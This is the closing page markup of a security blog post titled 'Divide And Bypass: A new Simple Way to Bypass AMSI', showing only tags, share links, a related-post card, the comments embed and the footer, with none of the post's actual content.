class="post-tag no-text-decoration" >powershell</a> <a href="/tags/bypass/" class="post-tag no-text-decoration" >bypass</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >windows</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Divide+And+Bypass%3A+A+new+Simple+Way+to+Bypass+AMSI+-+x4sh3s&url=https%3A%2F%2Fx4sh3s.github.io%2Fposts%2FDivide-and-bypass-amsi%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Divide+And+Bypass%3A+A+new+Simple+Way+to+Bypass+AMSI+-+x4sh3s&u=https%3A%2F%2Fx4sh3s.github.io%2Fposts%2FDivide-and-bypass-amsi%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fx4sh3s.github.io%2Fposts%2FDivide-and-bypass-amsi%2F&text=Divide+And+Bypass%3A+A+new+Simple+Way+to+Bypass+AMSI+-+x4sh3s" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Divide-and-bypass-amsi/">Divide And Bypass: A new Simple Way to Bypass AMSI</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/amsi/">amsi</a> <a class="post-tag" href="/tags/bypass/">bypass</a> <a class="post-tag" href="/tags/c2/">C2</a> <a class="post-tag" href="/tags/edr/">EDR</a> <a class="post-tag" href="/tags/powershell/">powershell</a> <a class="post-tag" href="/tags/process-injection/">Process_Injection</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Certified-Red-Team-Lead-CRTL-Review-Struggle-and-Joy-Certification/"><div class="card-body"> <em class="small" data-ts="1701819120" data-df="ll" > Dec 6, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Certified Red Team Lead (CRTL) Review -- Struggle and Joy Certification</h3><div class="text-muted small"><p> In this post, i’ll be reviewing CRTL certification, my learning and exam experience with some tips and resources. Introduction After successfully obtaining my CRTO certification on July 4, I imme...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"><div class="btn btn-outline-primary disabled" prompt="Older"><p>-</p></div><a href="/posts/Certified-Red-Team-Lead-CRTL-Review-Struggle-and-Joy-Certification/" class="btn btn-outline-primary" prompt="Newer"><p>Certified Red Team Lead (CRTL) Review -- Struggle and Joy Certification</p></a></div><div id="disqus_thread"></div><script> /** * RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS. * LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables */ var disqus_config = function () { this.page.url = "https://x4sh3s.github.io/"; // Replace PAGE_URL with your page's canonical URL variable this.page.identifier = 'https://x4sh3s.github.io/posts/Divide-and-bypass-amsi/' // Replace PAGE_IDENTIFIER with your page's unique identifier variable }; (function() { // DON'T EDIT BELOW THIS LINE var d = document, s = d.createElement('script'); s.src = 'https://x4sh3s.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); </script> <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript><div id="disqus_thread" class="pt-2 pb-2"><p class="text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script type="text/javascript"> /* Lazy loading */ var disqus_observer = new IntersectionObserver(function (entries) { if(entries[0].isIntersecting) { (function () { var d = document, s = d.createElement('script'); s.src = 'https://x4sh3s.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); disqus_observer.disconnect(); } }, { threshold: [0] }); disqus_observer.observe(document.querySelector('#disqus_thread')); /* Auto switch theme */ function reloadDisqus() { /* Disqus hasn't been loaded */ if (typeof DISQUS === "undefined") { return; } if (document.readyState == 'complete') { DISQUS.reset({ reload: true, config: disqus_config }); } } const modeToggle = document.querySelector(".mode-toggle"); if (typeof modeToggle !== "undefined") { /* modeToggle.addEventListener('click', reloadDisqus); // not pretty for 'color-scheme' */ window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', reloadDisqus); } </script></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/x4sh3s">Brahim Chebli</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" rel="noopener">Jekyll</a> with <a href="#" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/amsi/">amsi</a> <a class="post-tag" href="/tags/bypass/">bypass</a> <a class="post-tag" href="/tags/c2/">C2</a> <a class="post-tag" href="/tags/edr/">EDR</a> <a class="post-tag" href="/tags/powershell/">powershell</a> <a class="post-tag" href="/tags/process-injection/">Process_Injection</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
